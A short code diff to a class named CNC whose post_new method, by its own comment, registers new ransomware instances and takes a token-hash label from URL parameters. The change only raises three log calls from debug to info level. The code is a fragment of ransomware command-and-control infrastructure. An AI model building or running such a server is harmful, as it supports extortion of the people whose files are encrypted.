@@ -28,9 +28,9 @@ class CNC(CNCBase):
     def post_new(self, path:str, params:dict, body:dict) -> dict:
         # used to register new ransomware instance
         # debug logging of all function parameters
-        self._log.debug(path)
-        self._log.debug(params)
-        self._log.debug(body)
+        self._log.info(path)
+        self._log.info(params)
+        self._log.info(body)
         # local handling of function parameters/data
         # The directory label is passed as a url parameter (hash of the token)
         label = params['label']
